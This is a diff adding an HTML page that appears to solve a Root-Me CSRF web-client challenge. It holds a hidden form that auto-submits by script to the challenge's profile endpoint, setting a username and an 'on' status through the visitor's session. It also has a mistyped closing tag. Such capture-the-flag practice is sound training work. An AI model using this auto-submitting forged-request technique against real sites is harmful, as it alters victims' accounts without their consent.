@@ -1,0 +1,11 @@
+<!-- in http://challenge01.root-me.org/web-client/ch22/?action=contact -->
+<html>
+  <head></head>
+  <body>
+    <form name=csrf action="http://challenge01.root-me.org/web-client/ch22/?action=profile" method="post" enctype="multipart/form-data">
+    <input type="hidden" name="username" value="a"> <!-- set name -->
+    <input type="hidden" name="status" value="on">
+    </from>
+    <script>document.csrf.submit()</script>
+  </body>
+</html>
